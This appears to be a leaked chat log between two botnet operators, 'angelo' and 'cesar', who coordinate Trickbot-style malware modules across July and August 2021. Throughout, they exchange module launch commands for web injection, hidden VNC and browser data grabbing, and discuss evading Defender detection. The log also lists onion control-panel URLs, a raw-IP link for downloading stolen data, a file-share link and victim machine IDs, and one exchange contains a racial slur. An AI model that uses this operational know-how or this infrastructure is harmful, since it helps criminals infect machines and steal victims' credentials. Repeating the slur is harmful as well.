@@ -1,0 +1,1417 @@
+[26.07.21 07:53:58] angelo: Hail Caesar!
+[26.07.21 07:54:10] angelo: thought to ask Adam, but better you for now))
+[26.07.21 07:54:21] angelo: I got a customer who told Zeus that their bots are dying
+[26.07.21 07:54:38] angelo: not in cuz ?
+[26.07.21 07:55:19] cesar: hi
+[26.07.21 07:55:30] cesar: we'll look into it
+[26.07.21 07:55:47] angelo: he's been having problems for weeks
+[26.07.21 07:56:02] angelo: don't live long
+[27.07.21 14:22:34] angelo: Hail bro!
+[27.07.21 14:22:43] angelo: did you find out what's with the bots at Zeus ?
+[27.07.21 14:22:58] angelo: can I help you?
+[27.07.21 14:42:01] cesar: what do you mean, what's his problem?
+[27.07.21 14:42:32] angelo: bots are dying
+[27.07.21 14:42:36] angelo: fast
+[28.07.21 17:02:37] angelo: hi.
+[28.07.21 17:02:48] angelo: what's the launch command with the inject logs
+[28.07.21 17:02:58] angelo: 61 tinjectDll start
+[28.07.21 17:03:43] cesar: yes
+[28.07.21 17:03:46] cesar: hi
+[28.07.21 17:04:09] angelo: https://cceqv5ulg6fc44budf3a4s5kkrhprk5okjmdtgmo6xevj2p2sxnkh3id.onion/log/14625795
+[28.07.21 17:04:17] angelo: can you see if it's running or not
+[28.07.21 17:04:20] angelo: I don't get it
+[28.07.21 17:04:29] cesar: sec.
+[28.07.21 17:05:13] cesar: it's a regular bot, not your test bot
+[28.07.21 17:05:24] angelo: yeah
+[28.07.21 17:05:25] cesar: so 62 tinjectDll start
+[28.07.21 17:05:26] angelo: I know
+[28.07.21 17:05:33] angelo: something's wrong with dillon again
+[28.07.21 17:05:51] cesar: )(
+[03.08.21 08:28:57] angelo: hi
+[03.08.21 08:29:09] angelo: listen, i got that thing again after rebooting the bot machine
+[03.08.21 08:29:24] angelo: like it says it can't find the module
+[03.08.21 08:30:03] angelo: so bots die after reboot ?
+[03.08.21 08:30:11] cesar: hi
+[03.08.21 08:30:16] cesar: which bot?
+[03.08.21 08:30:28] angelo: it was a trick
+[03.08.21 08:30:30] angelo: MOD
+[03.08.21 08:30:31] cesar: which one did you run?
+[03.08.21 08:30:39] angelo: um
+[03.08.21 08:30:43] cesar: mod8 ?
+[03.08.21 08:30:50] angelo: mod8_dfHarxhruR.dll
+[03.08.21 08:30:55] angelo: crypto
+[03.08.21 08:31:22] cesar: so, and after rebooting what was the message?
+[03.08.21 08:31:27] cesar: which one?
+[03.08.21 08:31:40] angelo: sec
+[03.08.21 08:32:17] angelo: There was a problem starting. The specified module could not be found
+[03.08.21 08:32:22] angelo: and there path
+[03.08.21 08:32:39] cesar: how long did the bot work?
+[03.08.21 08:32:42] angelo: to the file with grf extension
+[03.08.21 08:32:44] cesar: before that
+[03.08.21 08:32:50] angelo: one hour exactly
+[03.08.21 08:33:03] angelo: it's been repeated more than once
+[03.08.21 08:33:04] cesar: so defender took it down
+[03.08.21 08:33:13] angelo: no
+[03.08.21 08:33:18] angelo: let me see the history
+[03.08.21 08:34:18] angelo: no
+[03.08.21 08:34:28] angelo: history is clean
+[03.08.21 08:34:50] cesar: and bot knocked it out successfully?
+[03.08.21 08:35:03] angelo: i think not
+[03.08.21 08:35:06] angelo: let me see
+[03.08.21 08:36:13] angelo: no
+[03.08.21 08:36:15] angelo: no knocking
+[03.08.21 08:36:35] angelo: so the bot basically dies without detection after an overload
+[03.08.21 08:37:07] cesar: ok, I'll take a look. And mod8 from what date?
+[03.08.21 08:37:14] cesar: yesterday?
+[03.08.21 08:37:16] angelo: yesterday
+[03.08.21 08:37:18] angelo: yeah
+[03.08.21 08:37:24] cesar: okay, I'll check.
+[03.08.21 08:37:26] cesar: Thanks.
+[03.08.21 08:37:30] angelo: thanks!
+[03.08.21 08:53:18] cesar: yes, there is a bug, if the bot could not connect, then on the dll version is not prescribed
+[03.08.21 08:53:26] cesar: will fix it, thanks
+[03.08.21 08:53:46] angelo: great, thank you !
+[03.08.21 10:04:47] angelo: but tell me, is it normal that after starting bot, Windows is blocked ?
+[03.08.21 10:25:24] cesar: what exactly is blocked?
+[03.08.21 10:25:37] angelo: vinda
+[03.08.21 10:25:44] angelo: you know, like logging out
+[03.08.21 10:25:51] angelo: that happens to me a lot
+[03.08.21 10:25:53] angelo: haimee
+[03.08.21 10:26:02] cesar: this is the module's effect
+[03.08.21 10:26:08] angelo: well, I was thinking the same thing.
+[03.08.21 10:48:12] angelo: sorry, it's all about the ban
+[03.08.21 10:48:20] angelo: what's up with the trike cleanup ?
+[03.08.21 10:48:47] angelo: I still don't get it, why bots are killing Zeus
+[03.08.21 10:49:07] angelo: I run crypto and normal, silence, or they do not def eat?
+[03.08.21 10:50:09] cesar: working on it
+[03.08.21 10:50:24] cesar: most likely def is eating, but not immediately
+[03.08.21 10:50:56] angelo: got it, sorry for asking more than once
+[04.08.21 14:55:36] angelo: hi
+[04.08.21 14:55:45] angelo: give me a fresh bot
+[04.08.21 14:55:49] angelo: some kind of test bot
+[04.08.21 15:45:33] angelo: which VNC command launches the module ?
+[04.08.21 15:56:32] cesar: hi, I'll upload it soon
+[04.08.21 15:56:41] cesar: you with 61 command?
+[04.08.21 15:56:50] cesar: so others won't start?
+[04.08.21 15:57:17] angelo: yeah, whatever
+[04.08.21 15:57:20] angelo: not important
+[04.08.21 15:57:24] angelo: you can have him too
+[04.08.21 15:58:09] cesar: take it from the cryptopanel to the third admin
+[04.08.21 15:58:15] cesar: they're already crypto
+[04.08.21 15:58:32] cesar: rob120
+[04.08.21 15:58:35] cesar: mod8
+[04.08.21 15:58:44] cesar: any of those
+[04.08.21 16:00:05] angelo: ok
+[04.08.21 16:00:22] angelo: are you familiar with VNC ?
+[04.08.21 16:00:33] angelo: do you need to run the module in the black panel ?
+[04.08.21 16:02:40] cesar: yes
+[04.08.21 16:02:51] cesar: just tell me which vntz
+[04.08.21 16:03:09] angelo: shit
+[04.08.21 16:03:12] angelo: how many?!
+[04.08.21 16:04:05] cesar: ours is called vncDll
+[04.08.21 16:04:26] cesar: and we also wanted to connect third party
+[04.08.21 16:04:36] cesar: maybe that's what we're talking about
+[04.08.21 16:04:53] angelo: well, at least someone told me something
+[04.08.21 16:04:57] angelo: thanks - I'll find out
+[04.08.21 16:06:50] angelo: ours
+[04.08.21 16:06:55] angelo: vncDll
+[04.08.21 16:07:33] cesar: so the usual 62 vncDll start
+[04.08.21 16:37:15] angelo: also start the same way on tst61 ?
+[04.08.21 16:37:19] angelo: 62 vncDll start
+[04.08.21 16:38:42] angelo: i.e. to look through the viewer one should run vnc command first, right ?
+[04.08.21 16:52:53] angelo: need help bro
+[04.08.21 16:52:58] angelo: just a minute.
+[04.08.21 16:53:05] angelo: didn't know if VNC started or not
+[04.08.21 17:01:03] cesar: sec, I'll look for contact
+[04.08.21 17:01:13] angelo: 61
+[04.08.21 17:01:16] cesar: author vnts
+[04.08.21 17:01:16] angelo: loaded
+[04.08.21 17:01:20] angelo: no
+[04.08.21 17:01:25] angelo: good, it worked fine
+[04.08.21 17:01:44] cesar: he should be able to tap into your admin area
+[04.08.21 17:01:54] cesar: you can run the client itself
+[04.08.21 17:02:05] cesar: check how it works
+[04.08.21 17:02:13] angelo: everything's fine
+[04.08.21 17:02:16] angelo: started vntz
+[04.08.21 17:02:23] angelo: and botanal in the pink admin area
+[04.08.21 17:02:30] angelo: now watching the viewer
+[04.08.21 17:03:52] cesar: oh, okay.
+[05.08.21 10:13:18] angelo: hi.
+[05.08.21 10:13:21] angelo: !!!
+[05.08.21 10:13:27] angelo: pour new Inge ?
+[05.08.21 10:13:40] cesar: hi, yes
+[05.08.21 10:19:18] angelo: https://send.exploit.in/download/60e68773f33d7cb9/#jaKHbTdWgbf0a5C4CFxdkg
+[05.08.21 10:19:28] angelo: b52087ba2c17378794fa8c6257ccc746
+[05.08.21 10:19:47] cesar: ok
+[05.08.21 10:20:36] angelo: I think heimi already uploaded it, but just in case
+[05.08.21 10:25:25] cesar: it's done
+[05.08.21 10:25:32] angelo: ok thanks
+[05.08.21 10:25:44] angelo: did manuel write you ?
+[05.08.21 10:25:45] cesar: tinjectDll and injectDll, only 64 bit
+[05.08.21 10:25:52] angelo: he was testing the trike yesterday
+[05.08.21 10:26:01] angelo: ok, I'll check it
+[05.08.21 10:26:22] angelo: wait, did tinjectDll also update ?
+[05.08.21 10:26:32] angelo: I thought I sent you a not logged
+[05.08.21 10:26:42] cesar: yes, there was a logged one
+[05.08.21 10:26:48] angelo: aah
+[05.08.21 10:26:56] angelo: I'll check at run
+[05.08.21 10:27:24] angelo: here's one for you from manuel
+[05.08.21 10:27:25] angelo: As a result of the test, the dll of the BK has loaded the dll of the trike. Tric bot showed up in the admin area. Everything worked.
+Tested on the test server of our farm.
+After restarting, the window appeared:
+https://prnt.sc/1j37gab
+and the Wacatac.B!ml
+https://prnt.sc/1j432d0
+I understand that this is a trick detector on the fix.
+BC works after restarting the OS
+Bot: Bot ddfde222ad8e39e71a768615ed31d9b4
+bot trike: 162.244.82.215 DESKTOP-K6MLDD7_W10019043.397CB3BCC695B01FB121797AB933B331
+I think we need to do something about the fixing on the trike.
+Simple everything. Run the tricks dll in BC
+and see the result.
+[05.08.21 10:30:20] cesar: ok
+[05.08.21 11:23:43] angelo: I'm as good as always bro)
+[05.08.21 11:23:50] angelo: launch command
+[05.08.21 11:23:52] angelo: 62 ?
+[05.08.21 11:23:55] angelo: injection
+[05.08.21 11:24:04] angelo: I'm on mod8 bot now
+[05.08.21 11:24:58] cesar: yes
+[05.08.21 11:25:36] angelo: don't think, I'm not stupid, I just have a lot of mess in my head
+[05.08.21 11:26:27] cesar: me too, I don't even remember what I had for breakfast
+[05.08.21 11:26:35] cesar: so I understand
+[05.08.21 11:26:53] angelo: thanks. That's a relief.
+[05.08.21 11:27:05] cesar: )))
+[05.08.21 14:11:51] angelo: sorry !
+[05.08.21 14:11:52] angelo: )
+[05.08.21 14:12:13] angelo: remind me again
+[05.08.21 14:12:13] angelo: 62 WebiDll start
+[05.08.21 14:12:14] angelo: ?
+[05.08.21 14:14:54] angelo: vncDll start
+[05.08.21 14:14:54] angelo: yfitk
+[05.08.21 14:14:55] angelo: found it
+[05.08.21 14:16:10] cesar: ok
+[10.08.21 12:32:46] angelo: there ?
+[10.08.21 12:54:36] cesar: hi
+[10.08.21 12:54:44] angelo: hey
+[10.08.21 12:54:56] angelo: you can give me a test bot
+[10.08.21 12:55:09] angelo: we'll throw a test config for Inject on it
+[10.08.21 12:57:32] cesar: take anything from cryptopanel
+[10.08.21 12:59:04] angelo: no test ones there
+[10.08.21 12:59:12] angelo: I got 61 lying around
+[10.08.21 12:59:18] angelo: can i use it ?
+[10.08.21 12:59:25] cesar: pour now tst31
+[10.08.21 12:59:37] angelo: ok
+[10.08.21 12:59:38] cesar: it must be old, config is stale already
+[10.08.21 13:01:30] cesar: it's filled
+[10.08.21 13:01:40] angelo: thanks.
+[10.08.21 13:01:47] angelo: def will fill in config
+[11.08.21 11:50:29] angelo: Hail Caesar!
+[11.08.21 11:50:41] angelo: here they say to touch import
+[11.08.21 11:51:35] cesar: hi
+[11.08.21 11:51:41] cesar: touch it.)
+[11.08.21 11:51:48] angelo: yeah, i forgot
+[11.08.21 11:51:51] cesar: importDll getdata
+[11.08.21 11:51:56] cesar: the usual
+[11.08.21 11:51:59] angelo: how to see what it sends ?
+[11.08.21 11:51:59] cesar: 62
+[11.08.21 11:52:10] angelo: paired with something
+[11.08.21 11:52:21] cesar: well, the reports should come to the admin area
+[11.08.21 11:52:49] cesar: you can test it with a special program, then reports will be saved to a file
+[11.08.21 11:53:01] cesar: but you have a task to test via bot?
+[11.08.21 11:53:03] angelo: probably better to do it directly
+[11.08.21 11:53:07] angelo: i think so
+[11.08.21 11:53:20] angelo: I'll run 31
+[11.08.21 11:53:24] angelo: what you gave yesterday
+[11.08.21 11:53:45] cesar: ok, then give the command and wait, in 5-10 min after the start of the module should come events with the names of browsers in the black admin
+[11.08.21 11:53:58] angelo: ok
+[11.08.21 11:53:59] angelo: thanks
+[11.08.21 11:54:02] angelo: I'm on it.
+[11.08.21 11:54:05] cesar: if you don't understand something, write me.
+[11.08.21 11:54:11] cesar: 31 normal, yeah
+[11.08.21 11:54:16] angelo: got it
+[11.08.21 14:06:48] angelo: but to look log via pink panel ?
+[11.08.21 14:07:18] cesar: better the black one
+[11.08.21 14:07:26] cesar: I don't know anything about pink panel
+[11.08.21 14:07:27] angelo: no way
+[11.08.21 14:07:31] angelo: black
+[11.08.21 14:07:34] angelo: shows logs
+[11.08.21 14:07:38] angelo: and green icons
+[11.08.21 14:07:38] cesar: maybe there, but I have no idea
+[11.08.21 14:07:47] angelo: in black you can download ?
+[11.08.21 14:08:14] cesar: i don't know, ask frank
+[11.08.21 14:08:24] cesar: he's the pink one
+[11.08.21 14:08:36] angelo: DebugLog gives you a download
+[11.08.21 14:08:38] angelo: in black
+[11.08.21 14:08:39] cesar: maybe you can download there without any problems
+[11.08.21 14:08:49] angelo: in black how do you know ?
+[11.08.21 14:16:34] cesar: check with adam, he told me once, he dumped some ip
+[11.08.21 14:16:43] cesar: but it was a long time ago
+[11.08.21 14:16:46] angelo: got it
+[11.08.21 14:16:50] angelo: I'll use the pink one
+[12.08.21 11:44:43] angelo: bro
+[12.08.21 11:44:56] angelo: Adam told me how to download logs in black
+[12.08.21 11:44:58] angelo: but i don't understand
+[12.08.21 11:54:37] angelo: got it
+[12.08.21 11:55:57] cesar: ?
+[12.08.21 11:56:00] cesar: hi.
+[12.08.21 11:56:12] angelo: all right.)
+[12.08.21 11:56:30] cesar: ?)
+[12.08.21 12:05:24] angelo: can you see the debug of one bot ?
+[12.08.21 12:05:32] angelo: i was watching the import
+[12.08.21 12:05:34] angelo: no config
+[12.08.21 13:26:11] cesar: what do you mean no?
+[12.08.21 13:26:41] angelo: Def said if it's not pumping, then it's gone, look at the debugging
+[12.08.21 13:26:44] angelo: on this bot
+[12.08.21 13:26:55] angelo: /log/15668045
+[12.08.21 13:31:46] cesar: what bot?
+[12.08.21 13:31:56] cesar: chat's down
+[12.08.21 13:32:07] angelo: no logs from admin
+[12.08.21 13:32:10] angelo: don't give them
+[12.08.21 13:32:26] cesar: again
+[12.08.21 13:32:30] cesar: no response
+[12.08.21 13:32:42] angelo: does not let me download logs from admin area
+[12.08.21 13:32:48] angelo: Adam said look at the debuggs
+[12.08.21 13:33:13] cesar: bot link
+[12.08.21 13:33:16] angelo: i'm like a pig in oranges
+[12.08.21 13:33:16] cesar: repeat
+[12.08.21 13:33:26] angelo: https://cceqv5ulg6fc44budf3a4s5kkrhprk5okjmdtgmo6xevj2p2sxnkh3id.onion/log/15668045
+[12.08.21 13:33:36] cesar: okay.
+[12.08.21 13:33:51] angelo: maybe i'm a crooked asshole
+[12.08.21 13:34:01] angelo: I don't rule it out
+[12.08.21 13:35:07] cesar: ***** Send 12098 bytes to callback from Edge *****
+[12.08.21 13:35:25] cesar: ***** Send 22282 bytes to callback from Chrome *****
+[12.08.21 13:35:45] cesar: ***** Send 21155 bytes to callback from Firefox *****
+[12.08.21 13:36:09] cesar: data sent
+[12.08.21 13:36:17] cesar: I don't know how to download it
+[12.08.21 13:39:12] angelo: ok
+[12.08.21 13:39:29] angelo: bot from black is duplicated to pink so ?
+[12.08.21 13:40:03] angelo: it's easy
+[12.08.21 13:40:16] angelo: code is copied
+[12.08.21 13:40:21] angelo: with a link
+[12.08.21 13:40:29] angelo: from page(element) code
+[12.08.21 13:40:39] angelo: but I get an error
+[12.08.21 13:40:52] angelo: now let's try it in pink
+[12.08.21 13:42:34] angelo: <a href="mailto:_https://45.61.138.86/edownload/fgytf33578jg8zp345yhbffyh/GetLastEventData?cid=95C1F095A3C1BEB725CBB33BBF1E15BB&amp;module=importDll&amp;event=Firefox" class="btn btn-xs btn-success" ng-class="d.data?'btn-success':'btn-danger'">
+                <span class="glyphicon glyphicon-download-alt"></span>
+            </a>
+[12.08.21 13:42:43] angelo: and this is where the link is taken and should download
+[12.08.21 13:42:47] cesar: I don't know, it must be for adam
+[12.08.21 13:44:13] angelo: nonsense, now you let me download
+[12.08.21 13:47:01] angelo: only no chrome
+[12.08.21 13:47:01] angelo: in admin
+[12.08.21 13:48:57] cesar: how not?
+[12.08.21 13:49:00] cesar: 2021-08-11 13:52:41 importDll Chrome grabber grab_impl
+[12.08.21 13:49:21] angelo: hmm.
+[12.08.21 13:49:25] angelo: wait a minute
+[12.08.21 13:50:51] angelo: ok
+[12.08.21 13:50:58] angelo: number 11
+[12.08.21 13:51:33] angelo: 2021-08-11
+[12.08.21 13:52:44] cesar: there's the bot from yesterday
+[12.08.21 13:53:06] angelo: https://cceqv5ulg6fc44budf3a4s5kkrhprk5okjmdtgmo6xevj2p2sxnkh3id.onion/log/15756658
+[12.08.21 13:53:12] angelo: wrong bot
+[12.08.21 13:54:05] cesar: download debuglog
+[12.08.21 13:54:16] angelo: downloaded
+[12.08.21 13:54:20] cesar: it says he sent the module
+[12.08.21 13:54:25] cesar: and what size
+[12.08.21 13:54:47] cesar: ***** Send 5099 bytes to callback from InternetExplorer *****
+[12.08.21 13:55:04] cesar: ***** Send 20158 bytes to callback from Edge *****
+[12.08.21 13:55:15] cesar: ***** Send 22410 bytes to callback from Firefox *****
+[12.08.21 13:55:22] cesar: no chrome for some reason
+[12.08.21 13:56:12] angelo: and I see Send 22282 bytes to callback from Chrome
+[12.08.21 13:56:24] cesar: looks like chrome was launched on this machine
+[12.08.21 13:56:30] angelo: hmm.
+[12.08.21 13:56:37] angelo: I need to redo it
+[12.08.21 13:56:45] cesar: and module couldn't close it and open a new one
+[12.08.21 13:57:03] angelo: got it
+[12.08.21 17:38:27] angelo: how do i know if config is loaded or not ?
+[12.08.21 17:38:29] angelo: Zeus is having trouble
+[12.08.21 17:41:43] angelo: https://dnog7cgicmkrvugrfxexo34gikjbr54sd5skxj4r42aj4tuy2hjsw6qd.onion/logpost/more_ex/2BBF4D5F767B3C58F3356A97F9BBA3F9
+[12.08.21 17:45:38] cesar: config what?
+[12.08.21 17:49:08] angelo: zeus
+[12.08.21 17:49:11] angelo: for inject
+[12.08.21 17:49:39] angelo: remember, we're uploading for the injector
+[12.08.21 17:49:55] angelo: here you can find out if the config was loaded or not
+[12.08.21 17:49:59] angelo: this bot
+[12.08.21 17:50:18] cesar: I'll look in black
+[12.08.21 17:58:14] cesar: yes, it's been running for a long time
+[12.08.21 17:58:24] cesar: and winj updated an hour ago
+[12.08.21 17:58:43] cesar: there's only a problem with pwgrabb module
+[12.08.21 17:58:54] cesar: restarts all the time
+[12.08.21 17:59:06] angelo: shit
+[12.08.21 17:59:08] cesar: is this a test bot?
+[12.08.21 17:59:10] angelo: there are problems all around
+[12.08.21 17:59:12] angelo: no
+[12.08.21 17:59:13] angelo: combat
+[12.08.21 17:59:27] cesar: shit
+[12.08.21 17:59:54] angelo: still have time to watch ?
+[12.08.21 18:00:09] angelo: maybe it's the same on the others
+[12.08.21 18:01:30] angelo: DESKTOP-RNSI80R_W10019041.2A7B31C73738B3369BD9BC8F337FEB7A
+[12.08.21 18:01:36] cesar: why did you ask about config?
+[12.08.21 18:02:01] angelo: config proger looked at the page code and did not see the inject code
+[12.08.21 18:02:11] angelo: so the config didn't work
+[12.08.21 18:02:28] angelo: LAPTOP-LR24DEHJ_W10019042.33128FFE82FB3EC5BBF1EBB6193B73F7
+[12.08.21 18:02:29] angelo: and here
+[12.08.21 18:02:43] angelo: look at these, maybe we'll see something
+[12.08.21 18:03:40] cesar: 2021-08-12 17:45:18.843293 vncconf2 5
+[12.08.21 18:03:57] cesar: updated 15 min ago by DESKTOP-RNSI80R_W10019041.2A7B31C73737B3369BD9BC8F337FEB7A
+[12.08.21 18:04:07] cesar: I updated before, everything is ok here
+[12.08.21 18:04:27] angelo: well, at least there's no problem with the robber module
+[12.08.21 18:04:37] angelo: okay, let's go with Hymie
+[12.08.21 18:04:53] angelo: let's run logical and see
+[12.08.21 18:05:00] angelo: left for 10 min
+[13.08.21 10:35:51] angelo: hey bro
+[13.08.21 10:36:03] angelo: can i run a new vntz on test 31 bot ?
+[13.08.21 10:38:56] cesar: hi
+[13.08.21 10:38:58] cesar: yes
+[13.08.21 10:39:09] cesar: 62 vnc2Dll start
+[13.08.21 10:41:19] angelo: yeah
+[13.08.21 10:41:25] angelo: senkyu vei mach
+[13.08.21 11:04:22] angelo: do you know about the pink admin ?
+[13.08.21 11:04:27] angelo: I pressed the button and nothing happened
+[13.08.21 11:05:26] cesar: button what?
+[08.13.21 11:05:27] angelo: i meant vnts
+[08.13.21 11:05:31] angelo: vnts 2
+[13.08.21 11:05:47] cesar: look for this bot in the black admin
+[13.08.21 11:06:02] cesar: there's a button that just gives the job to load the module
+[13.08.21 11:06:21] angelo: aah!
+[13.08.21 11:06:35] cesar: and to connect you have to search on a certain site for this bot, etc.
+[13.08.21 11:06:49] angelo: shit
+[13.08.21 11:06:52] angelo: how complicated it is
+[13.08.21 11:07:19] cesar: probably write to adam, this module is new - no one but him knows how
+[13.08.21 11:07:20] angelo: we need to enter the computer via vnts
+[13.08.21 11:07:27] angelo: Adam again
+[13.08.21 11:07:50] cesar: or ask him who to contact
+[13.08.21 17:14:03] angelo: how to run a network module
+[13.08.21 17:14:03] angelo: how to write it
+[13.08.21 17:14:08] angelo: to get bot into the pink admin area
+[13.08.21 17:15:02] cesar: networkDll start
+[13.08.21 17:15:08] angelo: thanks
+[17.08.21 12:32:00] angelo: hello
+[17.08.21 12:32:11] cesar: hi
+[17.08.21 12:32:21] angelo: yeah, I was wondering.
+[17.08.21 12:32:25] angelo: I entered the wrong command
+[17.08.21 12:33:18] angelo: tinjectlogDll
+[17.08.21 12:33:19] angelo: 62 tinjectDll start
+[17.08.21 12:33:19] angelo: instead of
+[17.08.21 12:34:00] angelo: that's it?)
+[17.08.21 12:34:13] cesar: what do you mean?
+[17.08.21 12:34:21] angelo: well, it's an old build ?
+[17.08.21 12:34:25] angelo: or will it be today's ?
+[17.08.21 12:34:37] cesar: today's
+[17.08.21 12:34:43] cesar: I poured it an hour ago
+[17.08.21 12:40:01] angelo: ok
+[17.08.21 13:14:51] angelo: tell me if we uploaded a new module, then by the fact all the working bots also got a new build ?
+[17.08.21 13:14:55] angelo: dumb as always
+[17.08.21 13:15:54] cesar: we uploaded it as a test one
+[17.08.21 13:16:02] angelo: ah
+[17.08.21 13:16:09] cesar: all go inportFll
+[17.08.21 13:16:13] cesar: importDll
+[17.08.21 13:16:21] cesar: injectDll
+[17.08.21 13:16:24] cesar: rather
+[17.08.21 13:16:30] angelo: got it
+[17.08.21 14:48:23] angelo: new build went to other groups ?
+[17.08.21 14:48:45] cesar: yes
+[17.08.21 16:56:38] angelo: here's a question
+[17.08.21 16:56:43] angelo: Zeus is watching the bot
+[17.08.21 16:56:51] angelo: who already had an injector overload
+[17.08.21 16:57:16] angelo: new (today's) changes will not take effect ?
+[17.08.21 16:57:18] angelo: i don't understand
+[17.08.21 16:57:41] cesar: you have to give injectDll start command on all bots
+[17.08.21 16:57:47] cesar: from admin area
+[17.08.21 16:57:54] cesar: to update modules
+[17.08.21 16:58:04] cesar: that's what adam does
+[17.08.21 16:58:14] angelo: send him a message
+[17.08.21 16:58:15] angelo: please
+[17.08.21 16:58:19] cesar: okay.
+[17.08.21 17:02:20] cesar: wrote, so far, like a fish on ice
+[18.08.21 09:05:07] angelo: hi.
+[18.08.21 09:05:34] angelo: our man of the people poured a new injector no ?
+[18.08.21 09:06:37] cesar: hi.
+[18.08.21 09:07:17] cesar: yesterday we filled in a new injector
+[18.08.21 09:07:28] cesar: not today
+[18.08.21 09:08:35] cesar: and they only filled 64-bit version
+[18.08.21 09:10:05] angelo: no, you asked adam to put the new build on all bots
+[18.08.21 09:10:06] angelo: he did ?
+[18.08.21 09:10:56] cesar: wrote that he would
+[18.08.21 09:14:31] angelo: ok
+[18.08.21 09:14:31] angelo: waiting
+[18.08.21 09:14:34] angelo: I'll text him too
+[18.08.21 11:05:13] angelo: there is no way to see yes, new build or not on the bots zeus ?
+[18.08.21 11:48:32] cesar: module can send version info to the admin area
+[18.08.21 11:48:46] cesar: don't remember if an injector does that
+[18.08.21 11:58:00] angelo: heime has a machine since yesterday, loaded it and as if another module was loaded
+[18.08.21 11:58:03] angelo: here we go
+[18.08.21 12:14:55] angelo: sorry.
+[18.08.21 12:15:05] angelo: now which command to run the inject ?
+[18.08.21 12:15:09] angelo: to make it new
+[18.08.21 12:15:12] angelo: new build
+[18.08.21 12:15:14] angelo: yesterday's
+[18.08.21 12:15:41] cesar: injectDll start
+[18.08.21 12:16:38] angelo: and with logs ?
+[18.08.21 12:20:07] angelo: okay, I'll start like this
+[18.08.21 12:23:44] angelo: look
+[18.08.21 12:23:49] angelo: starting injectDll start
+[18.08.21 12:23:53] angelo: look in the bot
+[18.08.21 12:24:04] angelo: tinjectDll 2021-08-17 12:27:01.6776 start Success
+[18.08.21 12:24:04] angelo: is it normal ?
+[18.08.21 12:25:35] cesar: why?
+[18.08.21 12:25:48] angelo: thought it would write differently
+[18.08.21 12:25:55] angelo: that's it
+[18.08.21 12:26:11] angelo: or it doesn't matter ?
+[18.08.21 12:26:13] cesar: how did you start it?
+[18.08.21 12:26:21] angelo: injectDll start
+[18.08.21 12:26:26] angelo: 62
+[18.08.21 12:26:30] cesar: send me the link to the bot
+[18.08.21 12:26:37] angelo: https://cceqv5ulg6fc44budf3a4s5kkrhprk5okjmdtgmo6xevj2p2sxnkh3id.onion/log/15889932
+[18.08.21 12:29:20] cesar: 2021-08-18 12:24:25 injectDll VERS browser Build date: Aug 17 2021 12:05:08
+[18.08.21 12:29:34] cesar: what's wrong?
+[18.08.21 12:30:28] angelo: that's right
+[18.08.21 12:30:30] angelo: forgive me
+[18.08.21 12:30:36] angelo: i know how to fuck things up
+[18.08.21 12:31:22] cesar:]
+[18.08.21 12:47:32] angelo: tell me, can i download a module from the admin?
+[18.08.21 12:48:42] cesar: no
+[18.08.21 12:48:48] angelo: got it.
+[18.08.21 12:48:50] cesar: you want the module?
+[18.08.21 12:48:51] angelo: 0 Kb
+[18.08.21 12:48:55] angelo: no
+[18.08.21 12:48:57] angelo: it is
+[18.08.21 12:49:03] angelo: injections don't work
+[18.08.21 12:49:07] angelo: yesterday everything was working
+[18.08.21 12:49:14] angelo: what the fuck!
+[18.08.21 12:49:46] angelo: how to start a new build with logs ?!
+[18.08.21 12:49:49] angelo: command
+[18.08.21 12:50:51] cesar: tinjectDll start
+[18.08.21 12:51:07] angelo: ok
+[18.08.21 14:14:59] angelo: no logs
+[18.08.21 14:15:05] angelo: is that really a command ?
+[18.08.21 14:16:45] angelo: we could not mix up the modules on the commands ?
+[18.08.21 14:18:31] cesar: check
+[18.08.21 14:19:33] cesar: no, that's right
+[18.08.21 14:20:04] cesar: write jaime on the log
+[19.08.21 10:19:48] angelo: Hail brother!
+[19.08.21 10:20:02] angelo: we need to throw the last injection on the bots
+[19.08.21 10:20:15] angelo: so they'll be happy like negroes
+[19.08.21 10:20:36] cesar: hi
+[19.08.21 10:20:43] cesar: okay, I'll upload it in 10 minutes
+[19.08.21 10:20:49] angelo: okay, bro.
+[19.08.21 10:24:11] cesar: Negroes are loaded
+[19.08.21 10:24:16] cesar: but only 64-bit
+[19.08.21 10:24:26] angelo: where did you put them on
+[19.08.21 10:24:29] cesar: 32 bit updates were not available
+[19.08.21 10:24:29] angelo: for accurate understanding
+[19.08.21 10:24:31] angelo: for which
+[19.08.21 10:24:35] angelo: got it
+[19.08.21 10:24:43] cesar: injectDll
+[19.08.21 10:24:53] angelo: well, which groups will they go to ?
+[19.08.21 10:25:00] angelo: it
+[19.08.21 10:25:01] cesar: all of them
+[19.08.21 10:25:05] angelo: okay.
+[19.08.21 10:25:08] cesar: for both admins
+[19.08.21 10:25:13] angelo: okay, bro.
+[19.08.21 10:25:15] angelo: accepted
+[19.08.21 10:25:34] angelo: and for them to update on bots - need Adam ?)
+[19.08.21 10:26:34] cesar: in general, to update all - yes
+[19.08.21 10:26:47] cesar: on a particular bot, you can update yourself
+[19.08.21 10:27:08] angelo: yes
+[19.08.21 10:27:09] angelo: thanks
+[19.08.21 17:18:31] angelo: tell me
+[19.08.21 17:18:43] angelo: here's adam launching a new module on bots
+[19.08.21 17:18:48] angelo: can we see it ?
+[19.08.21 17:18:56] angelo: you or frank
+[19.08.21 17:29:48] angelo: 3B3B2A7B74C33F7433B3F613570577FF
+[23.08.21 11:51:01] angelo: Hail Caesar !
+[23.08.21 11:51:15] angelo: you can watch bots in harinilisches ?
+[23.08.21 11:51:17] angelo: pink
+[23.08.21 12:00:54] cesar: hi
+[23.08.21 12:00:59] cesar: nope.
+[23.08.21 12:01:06] cesar: try frank
+[23.08.21 12:01:16] cesar: maybe he'll tell me who can look
+[23.08.21 12:01:35] angelo: ok
+[24.08.21 10:02:20] angelo: hello! Remember you said that you can overload the Moodle on a single bot?
+[24.08.21 10:02:23] angelo: how to do it ?
+[24.08.21 10:02:36] cesar: hi
+[24.08.21 10:02:51] cesar: re-render 62 module start
+[24.08.21 10:03:10] cesar: second option - unload module
+[24.08.21 10:03:19] cesar: 62 module release
+[24.08.21 10:03:46] angelo: so, sec, that is most likely Adam just uploaded the module a second time ?!
+[24.08.21 10:03:54] angelo: on all bots
+[24.08.21 10:04:56] cesar: most likely
+[24.08.21 10:05:01] cesar: and that's normal
+[25.08.21 07:46:08] angelo: hi
+[25.08.21 07:46:16] angelo: rebooted module yesterday, seems normal
+[25.08.21 07:46:19] cesar: hi
+[25.08.21 07:46:23] angelo: worked as needed
+[25.08.21 07:46:29] angelo: tell me, what about VNT?!
+[25.08.21 07:46:35] angelo: maybe there is info, it crashed yesterday
+[25.08.21 07:46:40] angelo: Adam partisan
